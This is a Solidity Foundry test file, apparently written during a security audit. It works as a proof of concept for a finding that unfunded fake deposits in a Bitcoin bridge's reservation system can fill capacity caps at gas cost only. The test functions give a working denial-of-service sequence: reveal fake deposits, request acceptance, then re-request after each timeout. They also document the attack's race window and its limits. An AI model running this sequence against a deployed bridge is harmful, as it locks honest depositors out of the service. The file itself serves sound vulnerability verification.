// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {Handlers} from "../fizz/handlers/Handlers.sol";
import {BtcBuilder} from "../fizz/utils/BtcBuilder.sol";
import {BitcoinTx} from "../../contracts/bridge/BitcoinTx.sol";
import {Deposit} from "../../contracts/bridge/Deposit.sol";
import {Reservation} from "../../contracts/bridge/Reservation.sol";

/// F01 PoC: "Fake unfunded deposits fill all reservation capacity".
///
/// Finding: REPO/.solidity-auditor/runs/20260930-085204/full-report.md lines 19-69.
///
/// Source lines involved (all under solidity/contracts/bridge/):
/// - Deposit.sol:204-420 `_revealDeposit`: no SPV proof is required. For a
///   deposit routed to the reservation vault the Bridge only checks that the
///   funding tx bytes hash to the script (Deposit.sol:320-349) and that the
///   amount is above the dust threshold (Deposit.sol:371-374). The Bitcoin
///   transaction does not have to exist. Nothing is paid or bonded (revealDeposit
///   is not payable, no token is pulled).
/// - Deposit.sol:225-253 caps the self chosen refund deadline at
///   now + reservationTermSeconds + 24h, which is the longest possible window.
/// - Reservation.sol:488-639 `requestReservationAcceptance`: only the depositor
///   may call (499-503), the wallet must be the committed one (535-538), and
///   then `reserveAcceptanceCapacity` is called (610). There is no proof that
///   the deposit is funded and no bond.
/// - Reservation.sol:921-959 `reserveAcceptanceCapacity`: increments
///   activeReservationsCount, reservationTotalAmount, walletReservationInfo
///   count and amount, with the revert strings "Active reservations cap
///   exceeded", "Total reserved amount cap exceeded", "Wallet reservations cap
///   exceeded", "Wallet reserved amount cap exceeded" (in this order).
/// - Reservation.sol:656-692 `notifyReservationAcceptanceTimedOut`: after
///   `timeoutAt` anyone releases the capacity; the generation is TimedOut and
///   the deposit may request a fresh generation (state stays Unknown,
///   Reservation.sol:520-528 only blocks a Pending generation). No penalty is
///   applied to the depositor.
/// - Reservation.sol:583-588 is the only thing that ends the loop for one fake
///   deposit: `timeoutAt + 24h <= refundDeadline`. A new fake deposit costs gas
///   only, so the attacker rotates deposits forever.
///
/// Claim checked: a caller with no BTC reveals deposits that are never funded,
/// requests acceptance, and repeats after each timeout, so the per-wallet
/// count / amount caps and the global occupancy / total amount caps stay full
/// and an honest depositor's request is rejected. The attacker pays gas only.
///
/// Conditions the report does not state (shown by the tests below):
/// 1. The attacker has to be first in the block after each timeout. Between the
///    timeout and the attacker's re-request the slot is free (see
///    test_F01_honestUserCanWinSlotInsideRaceWindowAfterTimeout). The attacker
///    bundles notify + request atomically, so this is a per-cycle race, not a
///    lock.
/// 2. The attacker must cover every Live wallet an honest user could use. The
///    wallet is committed in the deposit script at reveal time, so an honest
///    user can pick any wallet with a free slot. With the harness caps
///    (maxReservationsPerWallet = 5) that takes 5 fake deposits per wallet; with
///    the documented mainnet launch shape (maxReservationsPerWallet = 1,
///    maxActiveReservations <= liveWalletsCount, see
///    solidity/deploy/97_set_reservation_parameters.ts:98-105 and
///    solidity/deploy/98_generate_reservation_mainnet_calldata.ts:514-545) it
///    takes one fake deposit per Live wallet.
/// 3. Each fake deposit can be re-requested for about 89 days (until the refund
///    window margin blocks it), then the attacker reveals a fresh fake deposit.
contract F01FakeDepositCapacityTest is Test, Handlers {
    modifier asActor() override {
        vm.startPrank(actor);
        _;
        vm.stopPrank();
    }

    struct Wealth {
        uint256 eth;
        uint256 bank;
        uint256 tbtc;
        uint256 bridgeEth;
        uint256 reservationVaultEth;
    }

    address internal f01Attacker;
    address internal f01Honest;
    uint256 internal f01Nonce;
    bytes20 internal w0;
    bytes20 internal w1;
    bytes20 internal w2;
    uint256[] internal f01Keys;
    /// Honest deposit keys, one per wallet in the launch-shape test (w0, w1, w2).
    uint256[] internal f01HonestKeys;

    function setUp() public {
        setup();
        // Wallet 0 is registered by setup(). Two more Live wallets.
        w0 = BtcBuilder.pubKeyHash(walletPubX[0], walletPubY[0]);
        w1 = _registerWalletFromKey(1);
        w2 = _registerWalletFromKey(2);

        f01Attacker = makeAddr("f01.attacker");
        f01Honest = makeAddr("f01.honest");
        // The attacker only has ETH for gas. No Bank balance, no tBTC, no BTC.
        vm.deal(f01Attacker, 10 ether);
        vm.deal(f01Honest, 10 ether);
    }

    // ---------------------------------------------------------------------
    // Tests
    // ---------------------------------------------------------------------

    /// Default harness caps (maxReservationsPerWallet = 5): five unfunded
    /// deposits fill wallet 0, every honest request on it is rejected, and the
    /// attacker keeps the slots across three timeout cycles at gas cost only.
    function test_F01_fakeDepositsFillWalletCountCapAndBlockHonestUser() public {
        Wealth memory beforeAttack = _wealth(f01Attacker);
        _eq(beforeAttack.bank, 0, "attacker starts with no Bank balance");
        _eq(beforeAttack.tbtc, 0, "attacker starts with no tBTC");

        // The honest depositor reveals a real (funded) deposit up front.
        uint256 honestKey = _f01Reveal(f01Honest, w0, 50_000);

        // Attacker: five unfunded deposits of the single-reservation cap.
        uint256 gasFill = _fillWallet(w0, uint256(MAX_RESERVATIONS_PER_WALLET), 100_000);
        emit log_named_uint("F01 gas to reveal+request 5 fake deposits", gasFill);

        _assertOccupancy(w0, 5, 500_000, 5);
        {
            (, uint32 maxActive) = reservationRouter.activeReservationsCount();
            _eq(maxActive, 100, "global occupancy cap is nowhere near reached: the wallet cap binds");
        }
        // 5 fake + 1 honest reveal are pending reserved deposits.
        _eq(reservationRouter.pendingReservedDeposits(), 6);

        // No fake deposit was ever proven or swept; the Bridge holds no BTC for them.
        for (uint256 i; i < f01Keys.length; i++) {
            _eq(uint8(reservationRouter.reservations(f01Keys[i]).state), uint8(Reservation.ReservationState.Unknown));
            _eq(bridge.deposits(f01Keys[i]).sweptAt, 0);
        }

        // The honest user is rejected with the exact per-wallet cap revert.
        _expectHonestRejected(honestKey, w0, "Wallet reservations cap exceeded");

        // Three timeout cycles: notify + re-request atomically in the same block.
        uint256 gasCycleTotal;
        for (uint256 round = 1; round <= 3; round++) {
            _warpToAcceptanceTimeout(f01Keys[0]);
            gasCycleTotal += _cycleAttackerKeys(w0);

            for (uint256 i; i < f01Keys.length; i++) {
                _assertGeneration(f01Keys[i], round + 1);
            }
            _assertOccupancy(w0, 5, 500_000, 5);
            _expectHonestRejected(honestKey, w0, "Wallet reservations cap exceeded");
        }
        emit log_named_uint("F01 gas for 3 cycles of 5 keys (notify+request)", gasCycleTotal);
        // Illustrative price only: gas at 20 gwei, in wei.
        emit log_named_uint("F01 attacker cost at 20 gwei (wei), fill + 3 cycles", (gasFill + gasCycleTotal) * 20 gwei);

        // Attacker cost: gas only. No value, no bond, no slash, no token moved.
        _assertNoCostBeyondGas(beforeAttack);

        // Control: once the attacker stops re-requesting, the timeouts are released
        // by anyone and the honest request succeeds. The earlier reverts were
        // caused by the fake capacity alone.
        _warpToAcceptanceTimeout(f01Keys[0]);
        for (uint256 i; i < f01Keys.length; i++) {
            vm.prank(f01Honest);
            reservationRouter.notifyReservationAcceptanceTimedOut(f01Keys[i]);
        }
        _eq(reservationRouter.walletReservationsCount(w0), 0);
        vm.prank(f01Honest);
        reservationRouter.requestReservationAcceptance(honestKey, w0);
        _eq(reservationRouter.walletReservationsCount(w0), 1);
        _eq(reservationRouter.walletReservationsAmount(w0), 50_000);
    }

    /// Launch-shape configuration (maxReservationsPerWallet = 1, maxActive =
    /// liveWalletsCount = 3, total cap = maxActive * single cap): one fake
    /// deposit per Live wallet fills the global occupancy cap, the global
    /// amount cap and every wallet. No honest request on any wallet can succeed.
    function test_F01_oneFakeDepositPerLiveWalletBlocksEveryWallet() public {
        _eq(bridge.liveWalletsCount(), 3);
        _configureLaunchShape(3, 300_000);
        {
            (uint64 perWalletAmountCap, uint64 singleCap, uint32 maxActiveCap) = reservationRouter.reservationCaps();
            _eq(perWalletAmountCap, RESERVATION_MAX_AMOUNT_PER_WALLET);
            _eq(singleCap, RESERVATION_MAX_SINGLE_AMOUNT);
            _eq(maxActiveCap, 3);
        }

        Wealth memory beforeAttack = _wealth(f01Attacker);

        // One honest (funded) deposit per Live wallet.
        f01HonestKeys.push(_f01Reveal(f01Honest, w0, 20_000));
        f01HonestKeys.push(_f01Reveal(f01Honest, w1, 20_000));
        f01HonestKeys.push(_f01Reveal(f01Honest, w2, 20_000));

        // One unfunded deposit of the single cap per Live wallet. Key order must be
        // w0, w1, w2, so the fills are separate statements (operand evaluation order
        // of `a + b` is unspecified in Solidity and the compiler ran it right to left).
        uint256 gasFill = _fillWallet(w0, 1, 100_000);
        gasFill += _fillWallet(w1, 1, 100_000);
        gasFill += _fillWallet(w2, 1, 100_000);
        emit log_named_uint("F01 gas for 3 fake deposits (reveal+request)", gasFill);

        _assertLaunchShapeSaturated();
        _expectAllHonestRejected();

        // Two timeout cycles, all three keys re-requested atomically.
        uint256 gasCycles;
        for (uint256 round = 1; round <= 2; round++) {
            _warpToAcceptanceTimeout(f01Keys[0]);
            gasCycles += _cycleAttackerAllWallets();

            for (uint256 i; i < f01Keys.length; i++) {
                _assertGeneration(f01Keys[i], round + 1);
            }
            _assertLaunchShapeSaturated();
            _expectAllHonestRejected();
        }
        emit log_named_uint("F01 gas for 2 cycles of 3 keys", gasCycles);

        _assertNoCostBeyondGas(beforeAttack);
    }

    /// Global amount cap: with a total cap of 300_000, three fake 100_000 deposits
    /// on wallet 0 (count 3 of 5, so the wallet itself still has free slots)
    /// block an honest request on a different, empty wallet.
    function test_F01_fakeAmountExhaustsGlobalTotalCapForEveryWallet() public {
        vm.prank(governance);
        reservationRouter.updateReservationParameters(
            address(reservationVault),
            RESERVATION_MIN_AMOUNT,
            RESERVATION_TX_MAX_FEE,
            RESERVATION_TERM_SECONDS,
            RESERVATION_DISSOLUTION_DELAY,
            300_000, // maxTotal <= 100 * 100_000
            MAX_RESERVATIONS_PER_WALLET,
            RESERVATION_ACTION_TIMEOUT,
            RESERVATION_RENEWAL_WINDOW_SECONDS
        );

        uint256 honestKey1 = _f01Reveal(f01Honest, w1, 20_000);
        uint256 honestKey0 = _f01Reveal(f01Honest, w0, 20_000);
        _fillWallet(w0, 3, 100_000);

        _eq(reservationRouter.walletReservationsCount(w0), 3);
        _eq(reservationRouter.walletReservationsCount(w1), 0, "wallet 1 has no reservation at all");
        (uint32 active, ) = reservationRouter.activeReservationsCount();
        _eq(active, 3, "far below maxActive = 100");
        _eq(_total(), 300_000);

        _expectHonestRejected(honestKey1, w1, "Total reserved amount cap exceeded");
        // Same error on the attacked wallet: the total check precedes the wallet checks.
        _expectHonestRejected(honestKey0, w0, "Total reserved amount cap exceeded");
    }

    /// Per-wallet amount cap: three fake 100_000 deposits fill a 300_000 wallet
    /// amount cap while the wallet count is 3 of 5. The honest request on that
    /// wallet is rejected, an honest request on another wallet works (control).
    function test_F01_fakeAmountExhaustsPerWalletAmountCap() public {
        vm.prank(governance);
        reservationRouter.updateReservationCaps(300_000, RESERVATION_MAX_SINGLE_AMOUNT, MAX_ACTIVE_RESERVATIONS);

        uint256 honestKey0 = _f01Reveal(f01Honest, w0, 20_000);
        uint256 honestKey1 = _f01Reveal(f01Honest, w1, 20_000);
        _fillWallet(w0, 3, 100_000);

        _eq(reservationRouter.walletReservationsAmount(w0), 300_000);
        _eq(reservationRouter.walletReservationsCount(w0), 3);

        _expectHonestRejected(honestKey0, w0, "Wallet reserved amount cap exceeded");

        vm.prank(f01Honest);
        reservationRouter.requestReservationAcceptance(honestKey1, w1);
        _eq(reservationRouter.walletReservationsCount(w1), 1, "other wallets are unaffected");
    }

    /// Condition the report does not state: the slot is free between the
    /// timeout and the attacker's re-request. An honest user who releases one
    /// timed-out fake generation and requests in the same block gets the slot,
    /// and the attacker's re-request of that key is then rejected.
    function test_F01_honestUserCanWinSlotInsideRaceWindowAfterTimeout() public {
        uint256 honestKey = _f01Reveal(f01Honest, w0, 50_000);
        _fillWallet(w0, uint256(MAX_RESERVATIONS_PER_WALLET), 100_000);
        _expectHonestRejected(honestKey, w0, "Wallet reservations cap exceeded");

        _warpToAcceptanceTimeout(f01Keys[0]);

        // Nobody has released anything yet: still full, even though all five are past timeoutAt.
        _expectHonestRejected(honestKey, w0, "Wallet reservations cap exceeded");

        // Honest user (or a bot acting for them) releases one slot and takes it.
        vm.startPrank(f01Honest);
        reservationRouter.notifyReservationAcceptanceTimedOut(f01Keys[0]);
        reservationRouter.requestReservationAcceptance(honestKey, w0);
        vm.stopPrank();

        _eq(reservationRouter.walletReservationsCount(w0), 5);
        _eq(
            uint8(reservationRouter.reservationActions(honestKey, 1).state),
            uint8(Reservation.ActionState.Pending),
            "honest acceptance authorization is live"
        );

        // The attacker lost that slot: its re-request of the released key is rejected.
        vm.startPrank(f01Attacker);
        vm.expectRevert(bytes("Wallet reservations cap exceeded"));
        reservationRouter.requestReservationAcceptance(f01Keys[0], w0);
        vm.stopPrank();
    }

    /// One fake deposit can be re-requested every day for 90 consecutive
    /// generations (about 89 days), then Reservation.sol:583-588 blocks it. The
    /// attacker then reveals another fake deposit (gas only) and the occupancy
    /// continues without a gap.
    function test_F01_oneFakeDepositLastsUntilRefundWindowThenAttackerRotates() public {
        Wealth memory beforeAttack = _wealth(f01Attacker);
        uint256 t0 = block.timestamp;
        uint256 key = _f01Reveal(f01Attacker, w0, 100_000);

        vm.startPrank(f01Attacker);
        reservationRouter.requestReservationAcceptance(key, w0);
        for (uint256 day = 1; day <= 90; day++) {
            vm.warp(t0 + day * 1 days);
            reservationRouter.notifyReservationAcceptanceTimedOut(key);
            if (day <= 89) {
                reservationRouter.requestReservationAcceptance(key, w0);
            } else {
                // refundDeadline = t0 + 91 days; timeoutAt (t0 + 91 days) + 24h > refundDeadline.
                vm.expectRevert(bytes("Authorization window would overlap the deposit refund window"));
                reservationRouter.requestReservationAcceptance(key, w0);
            }
        }
        vm.stopPrank();

        _eq(reservationRouter.reservations(key).requestNonce, 90, "90 consecutive generations from one fake deposit");
        _eq(reservationRouter.walletReservationsCount(w0), 0, "this deposit is out of generations");

        // Rotate: a new fake deposit, same attacker, no cost beyond gas.
        uint256 key2 = _f01Reveal(f01Attacker, w0, 100_000);
        vm.prank(f01Attacker);
        reservationRouter.requestReservationAcceptance(key2, w0);
        _eq(reservationRouter.walletReservationsCount(w0), 1);
        _eq(reservationRouter.walletReservationsAmount(w0), 100_000);

        Wealth memory afterAttack = _wealth(f01Attacker);
        _eq(afterAttack.eth, beforeAttack.eth);
        _eq(afterAttack.bank, beforeAttack.bank);
        _eq(afterAttack.tbtc, beforeAttack.tbtc);
        _eq(afterAttack.bridgeEth, beforeAttack.bridgeEth);
    }

    /// Existing governance tool: `forceStaleReservedDeposit` cannot evict a
    /// Pending generation (Reservation.sol:1201-1205). It only works in the gap
    /// between a notify and the attacker's re-request, i.e. governance has to win
    /// the same race the honest user has to win, once per fake deposit, and the
    /// attacker rotates to a new fake deposit at gas cost.
    function test_F01_governanceCannotEvictPendingGenerationOnlyBetweenGenerations() public {
        _fillWallet(w0, 1, 100_000);
        uint256 key = f01Keys[0];

        vm.prank(governance);
        vm.expectRevert(bytes("Acceptance authorization pending"));
        reservationRouter.forceStaleReservedDeposit(key);

        _warpToAcceptanceTimeout(key);
        reservationRouter.notifyReservationAcceptanceTimedOut(key);

        vm.prank(governance);
        reservationRouter.forceStaleReservedDeposit(key);
        _eq(reservationRouter.walletReservationsCount(w0), 0, "capacity free after governance clears the deposit");

        vm.startPrank(f01Attacker);
        vm.expectRevert(bytes("Wallet is not the deposit's designated wallet"));
        reservationRouter.requestReservationAcceptance(key, w0);
        vm.stopPrank();

        // The attacker reveals a new unfunded deposit and holds the slot again.
        _fillWallet(w0, 1, 100_000);
        _eq(reservationRouter.walletReservationsCount(w0), 1, "slot re-occupied by a new fake deposit");
    }

    // ---------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------

    /// Reveals a reserved deposit as `depositor` with a fresh, never-broadcast
    /// funding tx paying the deposit script `amount` sats. The refund deadline is
    /// the longest allowed by Deposit.sol:244-251.
    function _f01Reveal(address depositor, bytes20 wallet, uint64 amount) internal returns (uint256 key) {
        bytes32 entropy = keccak256(abi.encode("f01.deposit", ++f01Nonce));
        Deposit.DepositRevealInfo memory reveal = _revealInfo(depositor, wallet, entropy);
        (BitcoinTx.Info memory fundingTx, uint32 outputIndex) = BtcBuilder.depositFundingTx(
            reveal,
            depositor,
            bytes32(0),
            false,
            uint256(entropy) % 2 == 0,
            amount,
            entropy
        );
        key = uint256(keccak256(abi.encodePacked(BtcBuilder.txHash(fundingTx), outputIndex)));
        vm.prank(depositor);
        bridge.revealDeposit(fundingTx, reveal);
    }

    function _revealInfo(address depositor, bytes20 wallet, bytes32 entropy)
        internal
        view
        returns (Deposit.DepositRevealInfo memory)
    {
        uint256 locktime = block.timestamp + RESERVATION_TERM_SECONDS + 1 days;
        return
            Deposit.DepositRevealInfo({
                fundingOutputIndex: 0,
                blindingFactor: bytes8(keccak256(abi.encode(entropy, "blinding"))),
                walletPubKeyHash: wallet,
                refundPubKeyHash: bytes20(keccak256(abi.encode(entropy, depositor, "refund"))),
                refundLocktime: _le32(uint32(locktime)),
                vault: address(reservationVault)
            });
    }

    function _le32(uint32 v) internal pure returns (bytes4) {
        return bytes4((v << 24) | ((v & 0xff00) << 8) | ((v >> 8) & 0xff00) | (v >> 24));
    }

    /// Attacker reveals `n` unfunded deposits of `amount` sats for `wallet` and
    /// requests acceptance for each. Keys are appended to `f01Keys`. Returns
    /// the gas used.
    function _fillWallet(bytes20 wallet, uint256 n, uint64 amount) internal returns (uint256 gasUsed) {
        uint256 g = gasleft();
        for (uint256 i; i < n; i++) {
            uint256 key = _f01Reveal(f01Attacker, wallet, amount);
            f01Keys.push(key);
            vm.prank(f01Attacker);
            reservationRouter.requestReservationAcceptance(key, wallet);
        }
        gasUsed = g - gasleft();
    }

    /// Attacker bundle: for every tracked key release the timed-out generation
    /// and immediately request the next one, in the same block.
    function _cycleAttackerKeys(bytes20 wallet) internal returns (uint256 gasUsed) {
        uint256 g = gasleft();
        vm.startPrank(f01Attacker);
        for (uint256 i; i < f01Keys.length; i++) {
            reservationRouter.notifyReservationAcceptanceTimedOut(f01Keys[i]);
            reservationRouter.requestReservationAcceptance(f01Keys[i], wallet);
        }
        vm.stopPrank();
        gasUsed = g - gasleft();
    }

    /// Launch-shape variant of `_cycleAttackerKeys`: key i belongs to wallet i.
    function _cycleAttackerAllWallets() internal returns (uint256 gasUsed) {
        uint256 g = gasleft();
        vm.startPrank(f01Attacker);
        for (uint256 i; i < f01Keys.length; i++) {
            reservationRouter.notifyReservationAcceptanceTimedOut(f01Keys[i]);
            reservationRouter.requestReservationAcceptance(f01Keys[i], _walletOf(i));
        }
        vm.stopPrank();
        gasUsed = g - gasleft();
    }

    /// Launch shape fully used: 3 of 3 occupancy, 300_000 of 300_000 reserved,
    /// one reservation on each wallet.
    function _assertLaunchShapeSaturated() internal {
        (uint32 active, uint32 maxActive) = reservationRouter.activeReservationsCount();
        _eq(active, 3, "occupancy at the cap");
        _eq(maxActive, 3, "occupancy cap");
        _eq(_total(), 300_000, "global reserved amount at the cap");
        (, , , , , uint64 maxTotal, , uint32 maxPerWallet, , ) = reservationRouter.reservationParameters();
        _eq(maxTotal, 300_000, "global amount cap");
        _eq(maxPerWallet, 1, "one reservation per wallet");
        _eq(reservationRouter.walletReservationsCount(w0), 1);
        _eq(reservationRouter.walletReservationsCount(w1), 1);
        _eq(reservationRouter.walletReservationsCount(w2), 1);
    }

    /// Every honest key is rejected by the global occupancy cap (checked first
    /// in Reservation.sol:926-929).
    function _expectAllHonestRejected() internal {
        for (uint256 i; i < f01HonestKeys.length; i++) {
            _expectHonestRejected(f01HonestKeys[i], _walletOf(i), "Active reservations cap exceeded");
        }
    }

    /// Wallet of the i-th tracked key in the one-deposit-per-wallet test.
    function _walletOf(uint256 i) internal view returns (bytes20) {
        if (i == 0) return w0;
        if (i == 1) return w1;
        return w2;
    }

    function _warpToAcceptanceTimeout(uint256 key) internal {
        uint64 nonce = reservationRouter.reservations(key).requestNonce;
        vm.warp(reservationRouter.reservationActions(key, nonce).timeoutAt);
    }

    function _expectHonestRejected(uint256 honestKey, bytes20 wallet, string memory reason) internal {
        vm.startPrank(f01Honest);
        vm.expectRevert(bytes(reason));
        reservationRouter.requestReservationAcceptance(honestKey, wallet);
        vm.stopPrank();
    }

    /// Mainnet launch shape: one reservation per wallet, occupancy cap at most
    /// the live wallet count, total cap at most maxActive * single cap.
    function _configureLaunchShape(uint32 maxActive, uint64 maxTotal) internal {
        vm.startPrank(governance);
        reservationRouter.updateReservationParameters(
            address(reservationVault),
            RESERVATION_MIN_AMOUNT,
            RESERVATION_TX_MAX_FEE,
            RESERVATION_TERM_SECONDS,
            RESERVATION_DISSOLUTION_DELAY,
            maxTotal,
            1,
            RESERVATION_ACTION_TIMEOUT,
            RESERVATION_RENEWAL_WINDOW_SECONDS
        );
        reservationRouter.updateReservationCaps(
            RESERVATION_MAX_AMOUNT_PER_WALLET,
            RESERVATION_MAX_SINGLE_AMOUNT,
            maxActive
        );
        vm.stopPrank();
    }

    /// All reserved capacity in the system sits in `wallet`: its count and
    /// amount, plus the global occupancy and the global reserved amount.
    function _assertOccupancy(bytes20 wallet, uint256 walletCount, uint256 total, uint256 active) internal {
        _eq(reservationRouter.walletReservationsCount(wallet), walletCount, "wallet reservation count");
        _eq(reservationRouter.walletReservationsAmount(wallet), total, "wallet reserved amount");
        (uint32 activeNow, ) = reservationRouter.activeReservationsCount();
        _eq(activeNow, active, "global active reservations count");
        _eq(_total(), total, "global reserved amount");
    }

    /// `key` is on generation `nonce`: the previous generation timed out, the
    /// current one is Pending, and the position itself never left Unknown.
    function _assertGeneration(uint256 key, uint256 nonce) internal {
        Reservation.ReservationRequest memory r = reservationRouter.reservations(key);
        _eq(r.requestNonce, nonce, "generation counter");
        _eq(uint8(r.state), uint8(Reservation.ReservationState.Unknown), "position stays Unknown");
        _eq(
            uint8(reservationRouter.reservationActions(key, r.requestNonce - 1).state),
            uint8(Reservation.ActionState.TimedOut),
            "previous generation timed out"
        );
        _eq(
            uint8(reservationRouter.reservationActions(key, r.requestNonce).state),
            uint8(Reservation.ActionState.Pending),
            "new generation pending"
        );
    }

    /// No ETH, Bank balance or tBTC of the attacker moved, and neither the
    /// Bridge nor the reservation vault received ETH. (Foundry does not meter
    /// gas into balances, so gas is reported through the log lines.)
    function _assertNoCostBeyondGas(Wealth memory beforeAttack) internal {
        Wealth memory afterAttack = _wealth(f01Attacker);
        _eq(afterAttack.eth, beforeAttack.eth, "no ETH paid to any contract");
        _eq(afterAttack.bank, beforeAttack.bank, "no Bank balance used or lost");
        _eq(afterAttack.tbtc, beforeAttack.tbtc, "no tBTC used or lost");
        _eq(afterAttack.bridgeEth, beforeAttack.bridgeEth, "Bridge took no ETH bond");
        _eq(afterAttack.reservationVaultEth, beforeAttack.reservationVaultEth, "vault took no ETH");
    }

    /// Numeric equality on uint256 only. Avoids overload ambiguity between the
    /// uint256 and int256 variants of assertEq for small unsigned types.
    function _eq(uint256 a, uint256 b) internal {
        assertEq(a, b);
    }

    function _eq(uint256 a, uint256 b, string memory err) internal {
        assertEq(a, b, err);
    }

    function _total() internal view returns (uint64 t) {
        (, , , , , , t, , , ) = reservationRouter.reservationParameters();
    }

    function _wealth(address a) internal view returns (Wealth memory w) {
        w.eth = a.balance;
        w.bank = bank.balanceOf(a);
        w.tbtc = tbtc.balanceOf(a);
        w.bridgeEth = address(bridge).balance;
        w.reservationVaultEth = address(reservationVault).balance;
    }
}
